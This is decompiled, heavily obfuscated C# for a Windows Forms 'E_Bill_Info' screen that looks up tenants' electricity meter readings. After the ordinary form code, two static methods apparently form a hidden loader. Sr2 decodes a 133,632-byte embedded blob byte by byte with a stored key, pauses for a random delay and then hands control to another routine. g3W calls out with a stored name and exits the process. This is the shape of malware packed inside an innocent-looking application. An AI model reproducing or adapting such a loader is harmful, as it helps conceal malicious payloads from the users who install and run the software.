using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Hz6;
using Microsoft.VisualBasic.CompilerServices;
using Xp8;
using i8FQ;
using j4FQ;
using p9K;
using q5QZ;

namespace s6S;

[DesignerGenerated]
public class w1D : Form
{
	private IContainer components;

	private Button _Back;

	private ComboBox _ComboBox1;

	private DataGridView _DataGridView1;

	private DataGridViewTextBoxColumn _Column1;

	private DataGridViewTextBoxColumn _Column3;

	private DataGridViewTextBoxColumn _Column5;

	internal Panel e;

	internal Button l;

	internal ComboBox R;

	internal Label F;

	internal Label j;

	internal DataGridViewTextBoxColumn h;

	internal DataGridViewTextBoxColumn T;

	public w1D()
	{
		o1G();
	}

	protected override void Eo3(bool q9B)
	{
		try
		{
			if (q9B && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(q9B);
		}
	}

	private void o1G()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		n4D(new Panel());
		Wg4(new Button());
		Mx2(new Button());
		a8S(new ComboBox());
		Kp6(new ComboBox());
		Eo4(new Label());
		Zn2(new Label());
		Yp3(new DataGridView());
		Sa7(new DataGridViewTextBoxColumn());
		Ey9(new DataGridViewTextBoxColumn());
		q2T(new DataGridViewTextBoxColumn());
		Qg2(new DataGridViewTextBoxColumn());
		e2D(new DataGridViewTextBoxColumn());
		((Control)t5H()).SuspendLayout();
		((ISupportInitialize)j2D()).BeginInit();
		((Control)this).SuspendLayout();
		((Control)t5H()).get_Controls().Add((Control)(object)Mj8());
		((Control)t5H()).get_Controls().Add((Control)(object)Jt2());
		((Control)t5H()).get_Controls().Add((Control)(object)Wd2());
		((Control)t5H()).get_Controls().Add((Control)(object)Ak9());
		((Control)t5H()).get_Controls().Add((Control)(object)w0P());
		((Control)t5H()).get_Controls().Add((Control)(object)f3N());
		((Control)t5H()).set_Location(new Point(40, 50));
		((Control)t5H()).set_Name("Panel1");
		((Control)t5H()).set_Size(new Size(681, 159));
		((Control)t5H()).set_TabIndex(0);
		((Control)Mj8()).set_Location(new Point(530, 93));
		((Control)Mj8()).set_Name("Back");
		((Control)Mj8()).set_Size(new Size(107, 40));
		((Control)Mj8()).set_TabIndex(5);
		((ButtonBase)Mj8()).set_Text("Back");
		((ButtonBase)Mj8()).set_UseVisualStyleBackColor(true);
		((Control)Jt2()).set_Location(new Point(530, 22));
		((Control)Jt2()).set_Name("Search");
		((Control)Jt2()).set_Size(new Size(107, 46));
		((Control)Jt2()).set_TabIndex(4);
		((ButtonBase)Jt2()).set_Text("Search");
		((ButtonBase)Jt2()).set_UseVisualStyleBackColor(true);
		((ListControl)Wd2()).set_FormattingEnabled(true);
		((Control)Wd2()).set_Location(new Point(237, 102));
		((Control)Wd2()).set_Name("ComboBox2");
		((Control)Wd2()).set_Size(new Size(180, 24));
		((Control)Wd2()).set_TabIndex(3);
		((ListControl)Ak9()).set_FormattingEnabled(true);
		((Control)Ak9()).set_Location(new Point(237, 34));
		((Control)Ak9()).set_Name("ComboBox1");
		((Control)Ak9()).set_Size(new Size(180, 24));
		((Control)Ak9()).set_TabIndex(2);
		w0P().set_AutoSize(true);
		((Control)w0P()).set_Location(new Point(79, 102));
		((Control)w0P()).set_Name("FlatNumber");
		((Control)w0P()).set_Size(new Size(85, 17));
		((Control)w0P()).set_TabIndex(1);
		w0P().set_Text("Flat Number");
		f3N().set_AutoSize(true);
		((Control)f3N()).set_Location(new Point(79, 34));
		((Control)f3N()).set_Name("BlockName");
		((Control)f3N()).set_Size(new Size(83, 17));
		((Control)f3N()).set_TabIndex(0);
		f3N().set_Text("Block Name");
		j2D().set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		j2D().get_Columns().AddRange((DataGridViewColumn[])(object)new DataGridViewColumn[5]
		{
			(DataGridViewColumn)Qs5(),
			(DataGridViewColumn)Ep3(),
			(DataGridViewColumn)n8T(),
			(DataGridViewColumn)g9K(),
			(DataGridViewColumn)b0B()
		});
		((Control)j2D()).set_Location(new Point(90, 266));
		((Control)j2D()).set_Name("DataGridView1");
		j2D().get_RowTemplate().set_Height(24);
		((Control)j2D()).set_Size(new Size(543, 143));
		((Control)j2D()).set_TabIndex(1);
		((DataGridViewColumn)Qs5()).set_HeaderText("Tenant ID");
		((DataGridViewColumn)Qs5()).set_Name("Column1");
		((DataGridViewColumn)Ep3()).set_HeaderText("Date");
		((DataGridViewColumn)Ep3()).set_Name("Column2");
		((DataGridViewColumn)n8T()).set_HeaderText("Previous Reading");
		((DataGridViewColumn)n8T()).set_Name("Column3");
		((DataGridViewColumn)g9K()).set_HeaderText("Current Reading");
		((DataGridViewColumn)g9K()).set_Name("Column4");
		((DataGridViewColumn)b0B()).set_HeaderText("Total Reading");
		((DataGridViewColumn)b0B()).set_Name("Column5");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(800, 450));
		((Control)this).get_Controls().Add((Control)(object)j2D());
		((Control)this).get_Controls().Add((Control)(object)t5H());
		((Control)this).set_Name("E_Bill_Info");
		((Form)this).set_Text("E_Bill_Info");
		((Control)t5H()).ResumeLayout(false);
		((Control)t5H()).PerformLayout();
		((ISupportInitialize)j2D()).EndInit();
		((Control)this).ResumeLayout(false);
	}

	[SpecialName]
	internal virtual Panel t5H()
	{
		return e;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void n4D(Panel n4E)
	{
		Panel val = (e = n4E);
	}

	[SpecialName]
	internal virtual Button Mj8()
	{
		return _Back;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Wg4(Button y0K)
	{
		EventHandler eventHandler = Rk1;
		Button back = _Back;
		if (back != null)
		{
			((Control)back).remove_Click(eventHandler);
		}
		_Back = y0K;
		back = _Back;
		if (back != null)
		{
			((Control)back).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button Jt2()
	{
		return l;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Mx2(Button q8L)
	{
		Button val = (l = q8L);
	}

	[SpecialName]
	internal virtual ComboBox Wd2()
	{
		return R;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void a8S(ComboBox Hj4)
	{
		ComboBox val = (R = Hj4);
	}

	[SpecialName]
	internal virtual ComboBox Ak9()
	{
		return _ComboBox1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Kp6(ComboBox Hz0)
	{
		_ComboBox1 = Hz0;
	}

	[SpecialName]
	internal virtual Label w0P()
	{
		return F;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Eo4(Label y3C)
	{
		Label val = (F = y3C);
	}

	[SpecialName]
	internal virtual Label f3N()
	{
		return j;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Zn2(Label z3J)
	{
		Label val = (j = z3J);
	}

	[SpecialName]
	internal virtual DataGridView j2D()
	{
		return _DataGridView1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Yp3(DataGridView Ga5)
	{
		_DataGridView1 = Ga5;
	}

	[SpecialName]
	internal virtual DataGridViewTextBoxColumn Qs5()
	{
		return _Column1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Sa7(DataGridViewTextBoxColumn Hs5)
	{
		_Column1 = Hs5;
	}

	[SpecialName]
	internal virtual DataGridViewTextBoxColumn Ep3()
	{
		return h;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ey9(DataGridViewTextBoxColumn Br5)
	{
		DataGridViewTextBoxColumn val = (h = Br5);
	}

	[SpecialName]
	internal virtual DataGridViewTextBoxColumn n8T()
	{
		return _Column3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void q2T(DataGridViewTextBoxColumn n3E)
	{
		_Column3 = n3E;
	}

	[SpecialName]
	internal virtual DataGridViewTextBoxColumn g9K()
	{
		return T;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Qg2(DataGridViewTextBoxColumn Nz0)
	{
		DataGridViewTextBoxColumn val = (T = Nz0);
	}

	[SpecialName]
	internal virtual DataGridViewTextBoxColumn b0B()
	{
		return _Column5;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void e2D(DataGridViewTextBoxColumn Xo6)
	{
		_Column5 = Xo6;
	}

	private void Rk1(object sender, EventArgs e)
	{
		((Form)this).Close();
		((Control)Gj9.Forms.Xp5()).Show();
	}

	internal static void Sr2()
	{
		byte[] array = z6G.c9F6(133632);
		checked
		{
			int z4NL = Conversions.ToInteger(j5N.mDic[j5N.sNum]) * 3;
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				array[i] = Qd2o.z9XE(array[i], (byte[])j5N.mDic[j5N.sArray], z4NL, i);
			}
			j5N.mDic.Add(j5N.mArray, array);
			Task.Delay(new Random().Next(1000, 5000)).Wait();
			g9Z2.a2TQ();
		}
	}

	internal static void g3W()
	{
		By10.j4XH(j5N.mDic[j5N.mName].ToString());
		Environment.Exit(Environment.ExitCode);
	}
}
